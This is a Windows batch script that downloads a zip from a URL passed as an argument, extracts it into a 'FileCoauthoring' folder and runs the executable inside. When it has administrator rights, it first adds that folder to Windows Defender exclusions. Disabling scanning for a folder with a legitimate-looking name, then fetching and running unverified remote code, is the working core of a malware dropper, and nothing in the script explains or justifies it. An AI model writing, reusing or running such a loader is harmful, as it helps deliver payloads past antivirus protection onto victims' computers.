@echo off
setlocal

:: Define parameters
set "url=%1"
set "zipName=%2"
set "exeName=%3"

:: Determine the directory path based on whether the script is run as administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    set "directoryPath=C:\Program Files\FileCoauthoring"
    if not exist "%directoryPath%" (
    mkdir "%directoryPath%"
    )
    :: Add the directory path to Windows Defender exclusions
    "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -AddExclusion -Path "%directoryPath%"
) else (
    set "directoryPath=%LOCALAPPDATA%\FileCoauthoring"
    if not exist "%directoryPath%" (
    mkdir "%directoryPath%"
)
)

:: Download the file
curl.exe -L -o "%directoryPath%\%zipName%" "%url%"

:: Extract the zip file
tar -xf "%directoryPath%\%zipName%" -C "%directoryPath%"

:: Remove the zip file
del "%directoryPath%\%zipName%"

:: Start the executable
start "" "%directoryPath%\%exeName%"

endlocal
